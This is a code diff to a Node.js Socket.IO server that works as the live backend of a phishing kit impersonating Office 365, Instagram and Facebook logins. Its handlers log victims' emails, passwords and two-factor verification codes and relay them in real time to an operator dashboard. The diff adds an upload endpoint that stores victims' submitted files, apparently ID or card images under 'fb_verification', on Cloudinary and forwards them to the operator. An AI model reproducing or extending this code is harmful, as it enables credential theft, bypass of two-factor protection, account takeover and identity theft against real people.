@@ -3,54 +3,98 @@ const http = require("http");
 const dotenv = require("dotenv");
 const cors = require("cors");
 const { Server } = require("socket.io");
+const multer = require("multer");
+const { v2: cloudinary } = require("cloudinary");
 
 dotenv.config();
+
+cloudinary.config({
+  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+  api_key: process.env.CLOUDINARY_API_KEY,
+  api_secret: process.env.CLOUDINARY_API_SECRET,
+});
 
 const app = express();
 
 app.use(
   cors({
-    origin: "*", // Frontend domain
-    methods: ["GET"], // Allowed HTTP methods
-    credentials: true, // Allow cookies if needed
+    origin: "*",
+    methods: ["GET", "POST"],
+    credentials: true,
   })
 );
 
-app.get("/health", (req, res) => {
-  res.status(200).json({ status: "healthy" });
-});
-
 const server = http.createServer(app);
 const io = new Server(server, {
-  cors: {
-    origin: [
-      process.env.ADMIN_URL,
-      process.env.OFFICE365_USER_URL,
-      process.env.IG_USER_URL,
-      process.env.FB_USER_URL,
-      // process.env.TEST_USER_URL,
-      // process.env.TEST_ADMIN_URL,
-    ],
-    methods: ["GET", "POST"],
-  },
+  // cors: {
+  //   origin: [process.env.TEST_USER_URL, process.env.TEST_ADMIN_URL],
+  //   methods: ["GET", "POST"],
+  // },
+  origin: [
+    process.env.ADMIN_URL,
+    process.env.OFFICE365_USER_URL,
+    process.env.IG_USER_URL,
+    process.env.FB_USER_URL,
+    // process.env.TEST_USER_URL,
+    // process.env.TEST_ADMIN_URL,
+  ],
 });
 
+const storage = multer.memoryStorage();
+const upload = multer({
+  storage,
+  limits: {
+    fileSize: 10 * 1024 * 1024, // 10MB limit
+    files: 5, // maximum 5 files
+  },
+}).array("files");
+
+// Wrap file upload in a promise for better error handling
+const handleUpload = (req, res) => {
+  return new Promise((resolve, reject) => {
+    upload(req, res, (err) => {
+      if (err instanceof multer.MulterError) {
+        reject({
+          status: 400,
+          message: `Multer upload error: ${err.message}`,
+        });
+      } else if (err) {
+        reject({
+          status: 500,
+          message: `Unknown upload error: ${err.message}`,
+        });
+      }
+      resolve(req.files);
+    });
+  });
+};
+
+// Cloudinary upload with proper error handling
+const uploadToCloudinary = async (file) => {
+  return new Promise((resolve, reject) => {
+    const uploadStream = cloudinary.uploader.upload_stream(
+      {
+        resource_type: "auto",
+        folder: "fb_verification",
+        timeout: 60000, // 60 second timeout
+      },
+      (error, result) => {
+        if (error) reject(error);
+        else resolve(result);
+      }
+    );
+
+    uploadStream.end(file.buffer);
+  });
+};
+
 let adminSockets = new Set();
-
 const userSessions = new Map();
-
 const sessions = new Map();
 
 io.on("connection", (socket) => {
   console.log("New connection:", socket.id);
 
-  // Relay events from login page to admin dashboard
-  socket.on("new-login-attempt", (data) => {
-    // Broadcast to all connected clients
-    io.emit("new-login-attempt", data);
-  });
-
-  // Handle admin registration
   socket.on("register_admin", () => {
     adminSockets.add(socket);
     console.log("Admin registered:", socket.id);
@@ -61,7 +105,6 @@ io.on("connection", (socket) => {
     });
   });
 
-  // Handle email verification requests from users
   socket.on("verify_email", (data) => {
     // Store session data
     const sessionData = sessions.get(data.sessionId) || {
@@ -87,35 +130,6 @@ io.on("connection", (socket) => {
       });
     });
   });
-
-  // socket.on("password-attempt", (data) => {
-  //   console.log("Received password attempt:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-  //   if (sessionData) {
-  //     console.log("data dey");
-  //     sessionData.events.push({
-  //       type: "password-submission",
-  //       timestamp: data.timestamp,
-  //       data: data.password,
-  //     });
-
-  //     // Broadcast to admins
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("password-attempt", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
 
   socket.on("password-attempt", (data) => {
     console.log("Received password attempt:", {
@@ -155,35 +169,6 @@ io.on("connection", (socket) => {
       });
     });
   });
-
-  // socket.on("authenticator-select", (data) => {
-  //   console.log("Received authenticator-select:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-
-  //   if (sessionData) {
-  //     sessionData.events.push({
-  //       type: "authenticator-select",
-  //       timestamp: data.timestamp,
-  //       email: data.email,
-  //       password: data.password,
-  //     });
-
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("authenticator-select", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
 
   socket.on("authenticator-select", (data) => {
     console.log("Received authenticator-select:", {
@@ -226,35 +211,6 @@ io.on("connection", (socket) => {
     });
   });
 
-  // socket.on("verifycode-select", (data) => {
-  //   console.log("Received verifycode-select:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-
-  //   if (sessionData) {
-  //     sessionData.events.push({
-  //       type: "verifycode-select",
-  //       timestamp: data.timestamp,
-  //       email: data.email,
-  //       password: data.password,
-  //     });
-
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("verifycode-select", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
-
   socket.on("verifycode-select", (data) => {
     console.log("Received verifycode-select:", {
       sessionId: data.sessionId,
@@ -295,37 +251,6 @@ io.on("connection", (socket) => {
       });
     });
   });
-
-  // socket.on("verify-click", (data) => {
-  //   console.log("Received verify-click:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //     verifyCode: data.verifyCode,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-
-  //   if (sessionData) {
-  //     sessionData.events.push({
-  //       type: "verify-click",
-  //       timestamp: data.timestamp,
-  //       email: data.email,
-  //       password: data.password,
-  //       verifyCode: data.verifyCode,
-  //     });
-
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("verify-click", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
 
   socket.on("verify-click", (data) => {
     console.log("Received verify-click:", {
@@ -368,35 +293,6 @@ io.on("connection", (socket) => {
       });
     });
   });
-
-  // socket.on("text-select", (data) => {
-  //   console.log("Received text-select:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-
-  //   if (sessionData) {
-  //     sessionData.events.push({
-  //       type: "text-select",
-  //       timestamp: data.timestamp,
-  //       email: data.email,
-  //       password: data.password,
-  //     });
-
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("text-select", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
 
   socket.on("text-select", (data) => {
     console.log("Received text-select:", {
@@ -469,35 +365,6 @@ io.on("connection", (socket) => {
     }
   });
 
-  // socket.on("call-select", (data) => {
-  //   console.log("Received call-select:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-
-  //   if (sessionData) {
-  //     sessionData.events.push({
-  //       type: "call-select",
-  //       timestamp: data.timestamp,
-  //       email: data.email,
-  //       password: data.password,
-  //     });
-
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("call-select", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
-
   socket.on("call-select", (data) => {
     console.log("Received call-select:", {
       sessionId: data.sessionId,
@@ -539,35 +406,6 @@ io.on("connection", (socket) => {
       });
     });
   });
-
-  // socket.on("call-authenticated", (data) => {
-  //   console.log("Received call-authenticated:", {
-  //     sessionId: data.sessionId,
-  //     email: data.email,
-  //     password: data.password,
-  //   });
-
-  //   const sessionData = sessions.get(data.sessionId);
-
-  //   if (sessionData) {
-  //     sessionData.events.push({
-  //       type: "call-authenticated",
-  //       timestamp: data.timestamp,
-  //       email: data.email,
-  //       password: data.password,
-  //     });
-
-  //     adminSockets.forEach((adminSocket) => {
-  //       adminSocket.emit("call-authenticated", {
-  //         ...data,
-  //         sessionId: data.sessionId,
-  //         timestamp: new Date().toISOString(),
-  //       });
-  //     });
-  //   } else {
-  //     console.error("No session found for sessionId:", data.sessionId);
-  //   }
-  // });
 
   socket.on("call-authenticated", (data) => {
     console.log("Received call-authenticated:", {
@@ -844,17 +682,6 @@ io.on("connection", (socket) => {
     console.error("Socket error:", error);
   });
 
-  // socket.on("login-attempt", (data) => {
-  //   // Broadcast to all connected clients
-  //   io.emit("login-attempt", data);
-  // });
-
-  // socket.on("verify_email", (data) => {
-  //   // Handle email verification
-  //   io.emit("email_verification_result", data);
-  //   // Emit 'email_verification_result' back to client
-  // });
-
   socket.on("disconnect", () => {
     for (const [sessionId, sess] of userSessions.entries()) {
       if (sess === socket) {
@@ -864,6 +691,278 @@ io.on("connection", (socket) => {
       }
     }
   });
+});
+
+// Modified file upload endpoint
+
+// app.post("/api/fb/upload", async (req, res) => {
+//   console.log("Received upload request");
+
+//   try {
+//     const files = await handleUpload(req, res);
+
+//     if (!files || files.length === 0) {
+//       throw {
+//         status: 400,
+//         message: "No files were uploaded",
+//       };
+//     }
+
+//     const { sessionId, email, timestamp } = req.body;
+
+//     if (!sessionId || !email) {
+//       throw {
+//         status: 400,
+//         message: "Missing required fields: sessionId and email",
+//       };
+//     }
+
+//     console.log(
+//       `Processing upload for session ${sessionId} and email ${email}`
+//     );
+
+//     const uploadedFiles = [];
+
+//     // Upload files to Cloudinary with error handling
+//     for (const file of files) {
+//       try {
+//         const uploadResult = await uploadToCloudinary(file);
+//         uploadedFiles.push({
+//           url: uploadResult.secure_url,
+//           public_id: uploadResult.public_id,
+//           originalName: file.originalname,
+//           fileName: file.originalname,
+//           fileType: file.mimetype,
+//           uploadedAt: new Date().toISOString(),
+//         });
+//         console.log(
+//           `Successfully uploaded file to Cloudinary: ${uploadResult.public_id}`
+//         );
+//       } catch (uploadError) {
+//         console.error(`Error uploading file to Cloudinary:`, uploadError);
+//       }
+//     }
+
+//     if (uploadedFiles.length === 0) {
+//       throw {
+//         status: 500,
+//         message: "Failed to upload any files to Cloudinary",
+//       };
+//     }
+
+//     // Store upload event in session with detailed file information
+//     const sessionData = sessions.get(sessionId) || {
+//       email,
+//       events: [],
+//     };
+
+//     const eventData = {
+//       type: "fb_card_upload",
+//       timestamp: timestamp || new Date().toISOString(),
+//       files: uploadedFiles.map((file) => ({
+//         url: file.url,
+//         fileName: file.fileName,
+//         fileType: file.fileType,
+//         uploadedAt: file.uploadedAt,
+//       })),
+//       email,
+//     };
+
+//     sessionData.events.push(eventData);
+//     sessions.set(sessionId, sessionData);
+//     console.log(`Updated session data for ${sessionId}`);
+
+//     // Send single event to admin with detailed file information
+//     let adminNotified = false;
+//     adminSockets.forEach((adminSocket) => {
+//       try {
+//         adminSocket.emit("fb_card_upload", {
+//           sessionId,
+//           email,
+//           timestamp: new Date().toISOString(),
+//           files: uploadedFiles.map((file) => ({
+//             url: file.url,
+//             fileName: file.fileName,
+//             fileType: file.fileType,
+//             uploadedAt: file.uploadedAt,
+//             preview: file.url, // Adding preview URL for direct image display
+//           })),
+//         });
+
+//         adminNotified = true;
+//         console.log(`Notified admin socket: ${adminSocket.id}`);
+//       } catch (emitError) {
+//         console.error(
+//           `Error notifying admin socket ${adminSocket.id}:`,
+//           emitError
+//         );
+//       }
+//     });
+
+//     return res.status(200).json({
+//       message: "Files uploaded successfully",
+//       files: uploadedFiles,
+//       sessionId,
+//       adminNotified,
+//     });
+//   } catch (error) {
+//     console.error("Error in upload endpoint:", error);
+//     const statusCode = error.status || 500;
+//     const message = error.message || "Internal server error during upload";
+//     return res.status(statusCode).json({
+//       message,
+//       error: process.env.NODE_ENV === "development" ? error : undefined,
+//     });
+//   }
+// });
+
+app.post("/api/fb/upload", async (req, res) => {
+  console.log("Received upload request");
+
+  try {
+    const files = await handleUpload(req, res);
+
+    if (!files || files.length === 0) {
+      throw {
+        status: 400,
+        message: "No files were uploaded",
+      };
+    }
+
+    const { sessionId, email, timestamp } = req.body;
+
+    if (!sessionId || !email) {
+      throw {
+        status: 400,
+        message: "Missing required fields: sessionId and email",
+      };
+    }
+
+    console.log(
+      `Processing upload for session ${sessionId} and email ${email}`
+    );
+
+    const uploadedFiles = [];
+    const failedUploads = [];
+
+    // Get user socket for notifications
+    const userSocket = userSessions.get(sessionId);
+
+    // Upload files to Cloudinary with error handling
+    for (const file of files) {
+      try {
+        const uploadResult = await uploadToCloudinary(file);
+        uploadedFiles.push({
+          url: uploadResult.secure_url,
+          public_id: uploadResult.public_id,
+          originalName: file.originalname,
+          fileName: file.originalname,
+          fileType: file.mimetype,
+          uploadedAt: new Date().toISOString(),
+        });
+        console.log(
+          `Successfully uploaded file to Cloudinary: ${uploadResult.public_id}`
+        );
+      } catch (uploadError) {
+        console.error(`Error uploading file to Cloudinary:`, uploadError);
+        failedUploads.push({
+          fileName: file.originalname,
+          error: uploadError.message || "Upload failed",
+        });
+      }
+    }
+
+    // If any uploads failed, notify user and return error
+    if (failedUploads.length > 0) {
+      if (userSocket) {
+        userSocket.emit("fb_card_upload_failed", {
+          error: "One or more files failed to upload",
+          failedFiles: failedUploads,
+          timestamp: new Date().toISOString(),
+        });
+      }
+
+      throw {
+        status: 500,
+        message: "One or more files failed to upload",
+        failedUploads,
+      };
+    }
+
+    // Store upload event in session with detailed file information
+    const sessionData = sessions.get(sessionId) || {
+      email,
+      events: [],
+    };
+
+    const eventData = {
+      type: "fb_card_upload",
+      timestamp: timestamp || new Date().toISOString(),
+      files: uploadedFiles.map((file) => ({
+        url: file.url,
+        fileName: file.fileName,
+        fileType: file.fileType,
+        uploadedAt: file.uploadedAt,
+      })),
+      email,
+    };
+
+    sessionData.events.push(eventData);
+    sessions.set(sessionId, sessionData);
+    console.log(`Updated session data for ${sessionId}`);
+
+    // Send to admin sockets only on successful upload
+    let adminNotified = false;
+    adminSockets.forEach((adminSocket) => {
+      try {
+        adminSocket.emit("fb_card_upload", {
+          sessionId,
+          email,
+          timestamp: new Date().toISOString(),
+          files: uploadedFiles.map((file) => ({
+            url: file.url,
+            fileName: file.fileName,
+            fileType: file.fileType,
+            uploadedAt: file.uploadedAt,
+            preview: file.url,
+          })),
+        });
+
+        adminNotified = true;
+        console.log(`Notified admin socket: ${adminSocket.id}`);
+      } catch (emitError) {
+        console.error(
+          `Error notifying admin socket ${adminSocket.id}:`,
+          emitError
+        );
+      }
+    });
+
+    return res.status(200).json({
+      message: "Files uploaded successfully",
+      files: uploadedFiles,
+      sessionId,
+      adminNotified,
+    });
+  } catch (error) {
+    console.error("Error in upload endpoint:", error);
+    const statusCode = error.status || 500;
+    const message = error.message || "Internal server error during upload";
+
+    // Notify user about the upload failure if not already notified
+    const userSocket = userSessions.get(req.body.sessionId);
+    if (userSocket && !error.failedUploads) {
+      userSocket.emit("fb_card_upload_failed", {
+        error: message,
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    return res.status(statusCode).json({
+      message,
+      error: process.env.NODE_ENV === "development" ? error : undefined,
+    });
+  }
 });
 
 app.get("/health", (req, res) => {
